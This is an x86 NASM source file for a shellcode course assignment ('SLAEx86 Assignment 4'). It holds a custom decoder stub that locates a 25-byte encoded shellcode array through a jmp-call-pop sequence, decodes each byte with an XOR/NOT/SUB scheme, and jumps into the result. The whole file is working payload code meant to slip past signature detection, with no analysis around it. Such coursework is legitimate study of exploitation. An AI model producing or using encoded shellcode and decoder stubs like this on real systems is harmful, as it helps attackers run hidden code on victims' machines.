; Filename: Slumberry.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 4

global _start			

section .text
_start:
	jmp short get_shellcode_addr

preparation:
	pop esi
	xor ecx, ecx
	mov cl, 25
	mov al, byte [esi]
	mov byte [esi], byte 0x90

decode:
	inc esi
	xor byte [esi], al
	not byte [esi]
	sub byte [esi], al
	loop decode

	jmp short encodedshellcode

get_shellcode_addr:
	call preparation
	encodedshellcode: db 0xe4,0x0e,0xbf,0x2f,0x57,0x08,0x08,0x4c,0x57,0x57,0x08,0x5d,0x56,0x49,0x76,0xdc,0x2f,0x76,0xdd,0x2c,0x76,0xde,0x8f,0xf4,0xaa,0x7f
